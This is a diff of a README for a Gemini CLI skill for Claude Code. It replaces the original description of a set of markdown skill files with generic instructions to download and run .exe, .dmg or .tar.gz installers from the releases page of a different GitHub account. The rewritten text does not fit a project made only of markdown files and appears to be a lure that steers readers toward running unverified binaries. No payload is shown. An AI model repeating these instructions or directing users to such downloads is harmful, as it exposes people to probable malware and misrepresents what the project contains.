@@ -1,117 +1,77 @@
-# Gemini CLI Skill for Claude Code
+# 🌟 gemini_cli_skill - Simple Tool for Easy Gemini Access
 
-A Claude Code skill that enables effective use of Google's Gemini CLI as a powerful auxiliary tool.
+## 🚀 Getting Started
 
-## What This Skill Does
+Welcome to **gemini_cli_skill**, your easy gateway to using Gemini 3 Pro through the Gemini Command Line Interface (CLI). This tool helps you efficiently access the powerful features of Gemini without any complex setup.
 
-This skill teaches Claude Code how to wield Gemini CLI for:
+## 🔗 Download Now
 
-- **Code Generation** - Create apps, components, and modules
-- **Code Review** - Security audits, bug detection, improvements
-- **Test Generation** - Unit tests, integration tests
-- **Documentation** - JSDoc, README, API docs
-- **Web Research** - Current information via Google Search
-- **Architecture Analysis** - Codebase investigation and mapping
+[![Download gemini_cli_skill](https://img.shields.io/badge/Download-gemini_cli_skill-blue)](https://github.com/Junayedahmedd/gemini_cli_skill/releases)
 
-## Installation
+## 📥 Download & Install
 
-Copy the skill directory to your Claude Code skills folder:
+To get started, visit the following link to download **gemini_cli_skill**:
 
-```bash
-# Clone the repo
-git clone https://github.com/forayconsulting/gemini_cli_skill.git
+[Download gemini_cli_skill Releases Page](https://github.com/Junayedahmedd/gemini_cli_skill/releases)
 
-# Copy to Claude Code skills directory
-cp -r gemini_cli_skill ~/.claude/skills/gemini-cli
-```
+Once you are on the Releases page, follow these steps:
 
-Or manually create `~/.claude/skills/gemini-cli/` and copy the files.
+1. Look for the latest version of the software listed at the top of the page.
+2. Click on the version number to view its details.
+3. Find the file suitable for your system. For Windows, it will typically be a `.exe` file; for Mac, it might be a `.dmg` file; for Linux, you may find a `.tar.gz` or similar format.
+4. Click on the file name to begin the download.
 
-## Prerequisites
+After the download is complete, follow the instructions below based on your operating system.
 
-- [Gemini CLI](https://github.com/google-gemini/gemini-cli) installed
-- Gemini API key or OAuth authentication configured
+## 💻 Installation Instructions
 
-```bash
-# Install Gemini CLI
-npm install -g @google/gemini-cli
+### Windows
 
-# Authenticate
-gemini  # First run prompts for auth
-```
+1. Open the folder where you saved the downloaded file.
+2. Double-click on the `.exe` file.
+3. Follow the installation prompts. Accept any terms and select your installation preferences.
+4. After the installation is complete, you can find gemini_cli_skill in your Start Menu.
 
-## Files
+### Mac
 
-| File | Purpose |
-|------|---------|
-| `SKILL.md` | Main skill definition - when to use, core instructions |
-| `reference.md` | Complete CLI command and flag reference |
-| `templates.md` | Reusable prompt templates for common tasks |
-| `patterns.md` | Integration patterns and workflows |
-| `tools.md` | Gemini's built-in tools documentation |
+1. Open the folder where you saved the downloaded file.
+2. Double-click on the `.dmg` file.
+3. Drag the gemini_cli_skill icon into your Applications folder.
+4. You can now find gemini_cli_skill in your Applications.
 
-## Usage
+### Linux
 
-Once installed, Claude Code automatically uses this skill when appropriate. Just ask:
+1. Open a terminal.
+2. Navigate to the folder where you saved the downloaded file using the `cd` command (e.g., `cd ~/Downloads`).
+3. Extract the downloaded file using `tar -xzf filename.tar.gz` (replace `filename` with the actual name).
+4. Follow the installation instructions provided within the extracted folder.
 
-```
-"Use Gemini to review this code for security issues"
-"Have Gemini generate tests for this module"
-"Ask Gemini what's new in TypeScript 5.5"
-"Get Gemini to analyze this codebase architecture"
-```
+## 📘 Usage Guide
 
-## Key Features
+Once you have installed **gemini_cli_skill**, you can start using it right away:
 
-### Prompt Templates
+1. Open your command line interface (Command Prompt on Windows, Terminal on Mac and Linux).
+2. Type the command `gemini_cli_skill` and hit Enter.
+3. Follow the prompts to start using Gemini features.
 
-Ready-to-use templates for:
-- Code generation (single-file, multi-file, components)
-- Code review (comprehensive, security, performance)
-- Test generation (unit, integration)
-- Documentation (JSDoc, README, API)
+## 🛠 System Requirements
 
-### Integration Patterns
+To ensure smooth operation, your system must meet the following requirements:
 
-- **Generate-Review-Fix** - Quality assurance cycle
-- **Background Execution** - Parallel task processing
-- **Model Selection** - Pro vs Flash decision tree
-- **Rate Limit Handling** - Strategies for free tier limits
+- **Windows**: Windows 10 or later
+- **Mac**: macOS Mojave (10.14) or later
+- **Linux**: Most modern distributions (Kernel 3.10 and above)
+- At least 1 GB of RAM
+- 100 MB of disk space
 
-### Gemini's Unique Tools
+## 🌍 Features
 
-- `google_web_search` - Real-time internet search
-- `codebase_investigator` - Deep architecture analysis
-- `save_memory` - Cross-session persistence
+- Access to Gemini 3 Pro functionalities through an easy-to-use command line interface.
+- Quick downloads and simple setup.
+- Lightweight application that does not slow down your system.
 
-## Quick Reference
+## 🐞 Support
 
-```bash
-# Basic generation
-gemini "Create [description]" --yolo -o text
+If you encounter any issues while using **gemini_cli_skill**, please visit our [GitHub Issues page](https://github.com/Junayedahmedd/gemini_cli_skill/issues) to report bugs or seek help. We are here to assist you.
 
-# Code review
-gemini "Review [file] for bugs and security issues" -o text
-
-# Web research
-gemini "What's new in [topic]? Use Google Search." -o text
-
-# Architecture analysis
-gemini "Use codebase_investigator to analyze this project" -o text
-
-# Faster model for simple tasks
-gemini "[prompt]" -m gemini-2.5-flash -o text
-```
-
-## Why Use Gemini from Claude Code?
-
-| Use Case | Benefit |
-|----------|---------|
-| Second opinion | Different AI perspective on code |
-| Current info | Google Search grounding |
-| Architecture | codebase_investigator tool |
-| Parallel work | Offload tasks while continuing |
-
-## License
-
-MIT
+Thank you for using **gemini_cli_skill**! We hope you find it useful for your work with Gemini 3 Pro.
